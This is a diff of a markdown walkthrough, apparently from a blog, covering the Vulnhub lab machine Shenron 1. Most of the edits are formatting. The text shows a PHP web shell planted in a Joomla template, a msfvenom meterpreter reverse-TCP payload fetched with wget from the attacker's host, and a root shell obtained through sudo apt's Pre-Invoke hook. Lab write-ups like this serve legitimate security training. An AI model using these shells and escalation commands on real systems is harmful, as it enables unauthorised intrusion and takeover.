@@ -9,7 +9,7 @@ author: christ
 ## Introduction
 Greetings everyone, in this walkthrough, we will talk about Shenron 1 which is the first machine of the Vulnhub Shenron series machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
 This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
-### Description
+### Machine's Description
 Name: Shenron 1<br>
 Goal: Get two flags<br>
 Difficulty: Beginner to Intermediate<br>
@@ -30,14 +30,14 @@ Current subnet identification: ```ip a```<br>
 Host discovery scan: ```sudo nmap -sn 10.0.2.15/24```<br><br>
 ![Host Identification](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/target-dis.png)
 
-After identifying our target on the network we need to know what services are run by our target to create different possible attack scenarios. We can start a service scan on our target using Nmap with the command below.<br> ```sudo nmap -sV -sC  10.0.2.4 -oA services-dis```
+After identifying our target on the network we need to know what services are run by our target to create different possible attack scenarios. We can start a service scan on our target using Nmap with the command below.<br> ```sudo nmap -sV -sC  10.0.2.4 -oA services-dis```<br><br>
 ![Service Scan](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/service-scan.png)
 
 We can see that the target is running both an SSH and an Apache web server. Web applications are known to contain many vulnerabilities so let's browse to the web application for further analyses. Unfortunately for us, we fall on the default Apache index page.
 ![Wep App Index Page](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/web%20app%20index%20page.png)
 
 In a real-world scenario, the default page might be left temporarily during the setup or testing phases of the web application. So let's try to find any hidden directories in the web application. I performed the fuzzing using **ffuf**, but you can use any tool of your preference. Here’s the command I used:<br>
-```ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.4/FUZZ```<br>
+```ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.4/FUZZ```<br><br>
 ![Directory Fuzzing](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/dir-fuzzing-1.png)
 
 The fuzzing process uncovers two interesting directories which are the *test* and *joomla*. The directory joomla already gives us a hint that the web application may be running the well-known Joomla CMS. Let's browse these directories chronologically as they are in our results. Upon browsing to the test directory, we noticed that directory listing is enabled, which constitutes a vulnerability since it appears to expose a file containing passwords. We should document this finding in our Findings folder.
@@ -54,16 +54,17 @@ Nex let's visit the second directory *joomla* uncovered during our fuzzing. We c
 Great, we successfully logged in as the admin. Next, we move to Extensions -> Templates -> Templates where attempt to add a PHP shell to a PHP file in an unused template. Here, I chose the protostar template and added a basic PHP shell ``` system($_GET["cmd"]);``` to the error.php file.
 *NB: In a real-world penetration test try to use a more complicated name for the GET parameter value such as a hash. This is because anyone can access that file hence if a common name is used, attackers may bruteforce it and also use it to establish their foothold in your client's environment.*
 ![Template Modification](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/template-modification.png)
-After modifying the template we can now execute commands on our target by browsing to the page and specify the command we want to run as the GET parameter's value.<br> ```curl http://10.0.2.4/joomla/templates/protostar/error.php?cmd=id```<br>
+After modifying the template we can now execute commands on our target by browsing to the page and specify the command we want to run as the GET parameter's value.<br> 
+```curl http://10.0.2.4/joomla/templates/protostar/error.php?cmd=id```<br><br>
 ![RCE Test](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/rce-test.png)
 
 This web shell is good but to facilitate our work, we will employ Meterpreter, a sophisticated payload integrated into the Metasploit Framework. To use a meterpreter on our target we first need to craft one using the msfvenom tool from the Metasploit Framework.<br>
-```msfvenom -p linux/x64/meterpreter_reverse_tcp  LHOST=10.0.2.15 LPORT=4444 -f elf > update.elf```<br>
+```msfvenom -p linux/x64/meterpreter_reverse_tcp  LHOST=10.0.2.15 LPORT=4444 -f elf > update.elf```<br><br>
 ![Payload Crafting](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/payload-crafting-1.png)
 After crafting the executable payload we then start a small HTTP server to transfer the payload to our target using Python3 http.server module.
 ![Python Server](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/python-server-1.png)
 
-We then use wget on the target to download the payload to the /tmp directory.<br> ```wget http://10.0.2.15/update.elf -O /tmp/update.elf```
+We then use wget on the target to download the payload to the /tmp directory.<br> ```wget http://10.0.2.15/update.elf -O /tmp/update.elf```<br><br>
 ![Download Operation](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/download-operation-1.png)
 Before executing the payload, we need to configure and run a listener in Metasploit.
 ![Metasploit Set Up](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/metasploit-set-up.png)
@@ -93,8 +94,8 @@ Some users tend to store their passwords in specific files so, let's try to enum
 ![File Enum](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/file-enum-2.png)
 We can now use that password to read Shenron's sudo privileges.
 ![Sudo Right](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/sudo-right-2.png)
-We observe that this account can be used to run apt with root privilege. Let's browse to [GTFOBins](https://gtfobins.github.io/gtfobins/apt/#sudo) to see how we can exploit this right to obtain a root shell. the command GTFOBins provides us with a way of exploiting this privilege but I chose to use the command below. <br>```sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh```
-![Root Access](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/root-access.png) 
+We observe that this account can be used to run apt with root privilege. Let's browse to [GTFOBins](https://gtfobins.github.io/gtfobins/apt/#sudo) to see how we can exploit this right to obtain a root shell. the command GTFOBins provides us with a way of exploiting this privilege but I chose to use the command below. <br>```sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh```<br><br>
+![Root Access](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/root-access.png)<br>
 Great, we have obtained root access to the machine, having this access means we own the machine and can do whatever we want. 
 
 ## Conclusion
